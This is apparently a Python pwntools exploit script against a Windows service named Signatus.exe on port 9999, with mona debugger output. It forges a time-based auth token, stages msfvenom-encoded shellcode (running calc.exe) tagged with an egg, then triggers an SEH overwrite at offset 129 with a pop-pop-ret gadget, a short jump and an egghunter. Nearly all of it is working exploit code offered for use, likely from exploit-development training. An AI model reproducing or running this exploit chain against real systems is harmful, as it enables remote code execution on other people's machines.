#!/usr/bin/python3
from pwn import remote, p32, asm, time

"""
[+] Command used:
!py mona exchain
Nr of SEH records : 2
Start of chain (TEB FS:[0]) : 0x0099f694
Address     Next SEH    Handler
-------     --------    -------
0x0099ffcc  0x41336541  0x65413465  (record smashed at offset 129)

[+] Command used:
!py mona seh -m signatus.exe
[+] Results :
0x60ae1b2b |   0x60ae1b2b : pop ecx # pop ecx # ret  |  {PAGE_EXECUTE_READ} [Signatus.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (signatus.exe)
"""

def otd():
    seconds = (int(time.time()) // 10) & 0xff
    otd = seconds | ((seconds ** 2) >> 4) << 8 | ((seconds ** 3) >> 8) << 16 | ((seconds ** 4) >> 12) << 24
    return p32((otd ^ 0x74829726) & 0xffffffff)

write = p32(1)
read = p32(2)
clear = p32(3)

# !py mona egghunter -wow64
egg = b"w00t" * 2

egghunter  = b""
egghunter += b"\x31\xd2\x66\x81\xca\xff\x0f\x31\xdb\x42"
egghunter += b"\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3"
egghunter += b"\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4"
egghunter += b"\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74"
egghunter += b"\x89\xd7\xaf\x75\xda\xaf\x75\xd7\xff\xe7"

offset = 129

nseh = asm("jmp $-126").ljust(4, b"A")
seh = p32(0x60ae1b2b)

# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x1a" -f python -v shellcode -e x86/jmp_call_additive
shellcode =  b""
shellcode += b"\xfc\xbb\xf8\xd7\xb9\x34\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x04\x3f\x3b\x34\xf4\xc0\x5c\xbc"
shellcode += b"\x11\xf1\x5c\xda\x52\xa2\x6c\xa8\x36\x4f\x06"
shellcode += b"\xfc\xa2\xc4\x6a\x29\xc5\x6d\xc0\x0f\xe8\x6e"
shellcode += b"\x79\x73\x6b\xed\x80\xa0\x4b\xcc\x4a\xb5\x8a"
shellcode += b"\x09\xb6\x34\xde\xc2\xbc\xeb\xce\x67\x88\x37"
shellcode += b"\x65\x3b\x1c\x30\x9a\x8c\x1f\x11\x0d\x86\x79"
shellcode += b"\xb1\xac\x4b\xf2\xf8\xb6\x88\x3f\xb2\x4d\x7a"
shellcode += b"\xcb\x45\x87\xb2\x34\xe9\xe6\x7a\xc7\xf3\x2f"
shellcode += b"\xbc\x38\x86\x59\xbe\xc5\x91\x9e\xbc\x11\x17"
shellcode += b"\x04\x66\xd1\x8f\xe0\x96\x36\x49\x63\x94\xf3"
shellcode += b"\x1d\x2b\xb9\x02\xf1\x40\xc5\x8f\xf4\x86\x4f"
shellcode += b"\xcb\xd2\x02\x0b\x8f\x7b\x13\xf1\x7e\x83\x43"
shellcode += b"\x5a\xde\x21\x08\x77\x0b\x58\x53\x12\xca\xee"
shellcode += b"\xee\x50\xcc\xf0\xf0\xc4\xa5\xc1\x7b\x8b\xb2"
shellcode += b"\xdd\xae\xef\x4d\x94\xf2\x46\xc6\x71\x67\xdb"
shellcode += b"\x8b\x81\x52\x18\xb2\x01\x56\xe1\x41\x19\x13"
shellcode += b"\xe4\x0e\x9d\xc8\x94\x1f\x48\xee\x0b\x1f\x59"
shellcode += b"\x8d\xca\xb3\x01\x7f\x68\x34\xa3\x7f\x72\xc4"
shellcode += b"\x2b\x7f\x72\xc4\x2b"

payload  = b""
payload += otd()
payload += clear

shell = remote("Windows", 9999)
shell.send(payload)
shell.close()

payload  = b""
payload += otd()
payload += write
payload += egg + shellcode
payload += b"D" * (2100 - len(payload))

shell = remote("Windows", 9999)
shell.send(payload)
shell.close()

payload  = b""
payload += otd()
payload += write
payload += b"A" * 10
payload += egghunter
payload += b"B" * (offset - (len(egghunter) + 10))
payload += nseh + seh
payload += b"C" * (200 - len(payload))

shell = remote("Windows", 9999)
shell.send(payload)
shell.close()

payload  = b""
payload += otd()
payload += read

shell = remote("Windows", 9999)
shell.send(payload)
shell.close()
